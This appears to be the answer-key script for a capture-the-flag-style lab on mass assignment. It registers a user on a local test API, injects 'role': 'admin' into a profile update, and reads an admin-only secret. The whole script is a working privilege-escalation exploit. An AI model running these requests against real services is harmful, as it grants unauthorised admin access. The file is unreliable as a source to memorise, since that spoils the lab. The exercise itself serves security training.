"""
Official solution for api-mass-assignment-01.

The PUT /api/users/me endpoint accepts a 'role' field without filtering it.
By sending role=admin in the update body, we escalate our privileges.
"""
import requests, json

TARGET = "http://localhost:5000"

# Step 1 — register
r = requests.post(f"{TARGET}/api/register",
    json={"username": "attacker", "password": "pass123"})
print("Register:", r.json())

headers = {"Authorization": "Bearer attacker"}

# Step 2 — check current role
r = requests.get(f"{TARGET}/api/users/me", headers=headers)
print("Before:", r.json())

# Step 3 — mass assignment: inject role=admin
r = requests.put(f"{TARGET}/api/users/me", headers=headers,
    json={"bio": "just a user", "role": "admin"})
print("After update:", r.json())

# Step 4 — access admin endpoint
r = requests.get(f"{TARGET}/api/admin/secret", headers=headers)
print("Admin secret:", r.json())
